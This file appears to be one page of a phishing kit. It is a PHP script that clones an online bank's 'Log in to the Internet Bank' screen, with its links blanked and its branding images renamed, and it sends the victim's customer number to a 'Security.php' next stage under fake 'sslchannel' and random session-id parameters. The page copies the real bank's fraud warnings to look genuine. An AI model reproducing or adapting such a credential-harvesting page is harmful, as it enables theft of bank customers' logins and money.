<?php
session_start();
require "../../includes/functions.php";
require "../../includes/One_Time.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
    <meta name="viewport" content="width=1000">
    <meta name="format-detection" content="telephone=no">
    <title>Log in</title>
	<link href="assets/css/common.css" rel="stylesheet" type="text/css">
    <link href="assets/css/one.css" rel="stylesheet" type="text/css">
    <link href="assets/css/two.css" rel="stylesheet" type="text/css">
    <link href="assets/css/three.css" rel="stylesheet" type="text/css">
    <link href="assets/css/four.css" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <link rel="apple-touch-icon" href="assets/img/two.png">
	<script>
	function IsEmpty() {
    var x = document.forms["login"]["user"].value;
    if (x == null || x == "") {
       document.getElementById("ErrorBox").style.display = "block";
       document.getElementById("InputErrorMsg").style.display = "block";
        return false;
    }
	else {
       document.getElementById("ErrorBox").style.display = "none";
       document.getElementById("InputErrorMsg").style.display = "none";		
		login.submit();
		return true;
		
	}
}
	</script>
  </head>



  <body id="log-in" class="two-col default-theme">
  <div id="cboxOverlay" style="display: none;"></div>
  <div id="colorbox" class="" style="padding-bottom: 35px; padding-right: 40px; display: none;">
  <div id="cboxWrapper">
  <div>
  <div id="cboxTopLeft" style="float: left;"></div>
  <div id="cboxTopCenter" style="float: left;"></div>
  <div id="cboxTopRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxMiddleLeft" style="float: left;"></div>
  <div id="cboxContent" style="float: left;">
  <div id="cboxLoadedContent" class="" style="width: 0px; height: 0px; overflow: hidden;"></div>
  <div id="cboxLoadingOverlay" class=""></div>
  <div id="cboxLoadingGraphic" class=""></div>
  <div id="cboxTitle" class=""></div>
  <div id="cboxCurrent" class=""></div>
  <div id="cboxNext" class=""></div>
  <div id="cboxPrevious" class=""></div>
  <div id="cboxSlideshow" class=""></div>
  <a id="cboxClose" href="#"><b class="button"></b><i><span class="srText">Close layer and return to page</span></i></a>
  </div>
  <div id="cboxMiddleRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxBottomLeft" style="float: left;"></div>
  <div id="cboxBottomCenter" style="float: left;"></div>
  <div id="cboxBottomRight" style="float: left;"></div>
  </div>
  
  </div>
  
  <div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div>
  </div>
    
    <div id="wrapper_outer">
      
    <header>
      <div class="welcome-util-container">
        <ul id="utility-links" role="navigation">
            <li class="demo">
                <a href="#">
                    Demo<span class="new-window-link"></span>
                            <span class="srText">Opens in a new window</span>
                     
                </a>
                
            </li>
            <li class="help">
                <a href="#">
                    Help centre
                    <span class="new-window-link"></span>
                    <span class="srText">Opens in a new window</span>
                </a>
                
            </li>
        </ul>
        
<div id="search">
    <a id="skipNavSearch"></a>
    <form action="#" method="post" name="logi">
<p style="color:#000000;font-size:11px">Search</p>
        <a class="btnSrchGo" href="#" value="Search"><b class="button"></b><i></i></a>
    </form>
</div>

      </div>
      <div id="brand" role="banner">
        
        <a class="logo" href="#">
            <img src="assets/img/mogo.png">
        </a>
        <img class="png title" src="assets/img/tag.png">
      </div>
    </header>

    <div id="wrapper_content">
        <div id="application">
            <div id="user-content" style="height: 470px;">
                <div class="javaScriptEnabled" style="display: block;">
                    <span>    
                    

<div class="secondary-nav">
            <ul>
            
                <li class="first secondary-nav-selected">
                    
                        <a href="#">Log in</a>
                    
                </li>
            
                <li class="last">
                    
                        <a href="#">Register</a>
                    
                </li>
            
           </ul>
</div>
                    <span>&nbsp;</span>
                    </span>
                    
<div class="related-services">
    <h2><img alt="Related services" src="assets/img/title.gif"></h2>
    <ul>
        
            <li>
                <a class="new-window-link" href="#">Help with card reader log in<span class="srText">Opens in a new window</span></a>
            </li>
        
            <li>
                <a class="new-window-link" href="#">Security centre<span class="srText">Opens in a new window</span></a>
            </li>
        
            <li>
                <a class="new-window-link" href="#">Contact us<span class="srText">Opens in a new window</span></a>
            </li>
        
            <li>
                <a class="new-window-link" href="#">Mobile Banking app<span class="srText">Opens in a new window</span></a>
            </li>
        
            <li>
                <a href="#">Order a new card reader</a>
            </li>
        
            <li>
                <a class="new-window-link" href="#">Service availability<span class="srText">Opens in a new window</span></a>
            </li>
        
            <li>
                <a class="new-window-link" href="#">Accessibility<span class="srText">Opens in a new window</span></a>
            </li>
        
    </ul>
</div>

                    <span>
                        
                    </span>
                </div>
            </div>
            <div id="stage" style="height: 510px;">
                <div id="stageInner" style="height: 465px;">

                    <div class="javaScriptEnabled" style="display: block;">
                        

<div id="pageMessageArea">
    <div id="info-pageMessageArea" class="page-msg info-msg no-msg" role="alert">
        <h2><span></span></h2>
        <div class="inner-msg">
            <p></p>
        </div>
    </div>
    <div id="warning-pageMessageArea" class="page-msg warning-msg no-msg" role="alert">
        <h2><span></span></h2>
        <div class="inner-msg">
            <p></p>
        </div>
    </div>
    <div id="ErrorBox" class="page-msg error-msg no-msg" role="alert"  style="display:none">
        <h2><span></span>Error</h2>
        <div class="inner-msg">
            <p>Sorry - you must correct the errors on this page before you can continue.</p>
        </div>
    </div>
    <div id="confirm-pageMessageArea" class="page-msg confirm-msg no-msg" role="alert">
        <h2><span></span></h2>
        <div class="inner-msg">
            <p></p>
        </div>
    </div>
</div>




<div class="validation-summary-valid page-msg error-msg" id="validationSummaryId" role="alert"><h2><b></b>Error</h2>
<div class="inner-msg"><p>Sorry - you must correct the errors on this page before you can continue.</p></div>
</div>

    
<div class="loginParentContainer">
        <div class="loginInternetBank">
    <div class="stage-head">
            <h1>Log in to the Internet Bank</h1>
    </div>
    <div class="content-pod login-pod">
        <h2>Enter your customer number</h2>
        <div class="inner-box cust-num-box">
            <form action="Security.php?sslchannel=true&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="login" name="login" method="post">
                <div class="inner-box-border">
                    <div class="cust-num-input">
					<span id="InputErrorMsg" class="field-validation-error" style="display:none"><span class="">This information is required.</span></span>
                        <label for="user">Customer number:</label>
                        <input class="cust-num-text text" data-val="true" data-val-regex="Enter numbers only." data-val-regex-pattern="^((T|t)\d{1,9})|(\d{1,10})$" data-val-required="This information is required." id="user" maxlength="10" name="user" type="text" value="">
                        <div class="clear-line"></div>
                        <a href="#">I've forgotten my customer number</a>
                    </div>
                    
                    <div class="rem-cust-num">
                        <div class="custom-tooltip-link">
                            <input class="checkbox" id="none" name="none" type="checkbox" value="true"><input name="none" type="hidden" value="false">
                            <label for="none">Remember my customer number *</label>
                            <a href="#" class="help-reveal"><b></b></a>
                        </div> 
                        * Only select this if this is your computer and it is not used by anyone else.
                    </div>
                    
                    <div class="clear-line">&nbsp;</div>
                </div>
                
                <div class="button-row">
                    <div class="inner-box-border">
                        <a id="Continue" class="btn-action btn-continue btn-border" href="#" onclick="return IsEmpty();"><i>Continue</i></a>
                    </div>
                </div>
            </form>
        </div>
        </div>
        </div>
    </div>
    
<div class="loginMySave">
    
        <div class="stage-head">
            <h1>Log in to MySave</h1>
        </div>
    

    <div class="loginMySaveContainer">
        <img class="png" src="assets/img/mogo2.png">

        
            <div>
                <a class="new-window-link new-window-link" href="#">What is MySave<span class="srText">Opens in a new window</span></a>
            </div>
        

        <div class="inner-box">   
            <a class="" href="#">Log in to MySave</a>
        </div>
    </div>
</div>


    <div class="information-box securityAdvice">
            
		<style>
                #stage ul, #stage ul li {list-style: disc}
                #stage ul li {margin-left:20px;}
                p.prominence {font-size:13px;font-weight:bold;}
</style>

<h3 style="padding-bottom:5px;">Protect yourself from fraud</h3>        
<p class="prominence">If you receive a telephone call asking you to use your card reader or transfer your money to another account, you should hang up and ignore the request.</p>
<p class="prominence">For more information on telephone scams and how to protect yourself from fraud, please <a href="#">visit our security centre<span class="new-window-link"></span></a>.</p>
<ul>
<li>Use this link for our <a href="#">Internet Bank Terms and Conditions<span class="new-window-link"></span></a>.</li>
<li>We use <a href="#">cookies<span class="new-window-link"></span></a> on this site to deliver you a secure and efficient banking service.</li>
<li>Always log out of Internet banking after you have finished.</li>
</ul>
        </div>

                    </div>
                </div>
            </div>
            <div id="nw-content" style="height: 460px;">
                <div class="javaScriptEnabled" style="display: block;">
                    <span>
                        
                    </span>
                </div>
            </div>
        </div>
        
    </div>
   
    
    <div id="footer">
        <footer>
        </footer>
    </div>

    </div>
       
</body>
</html>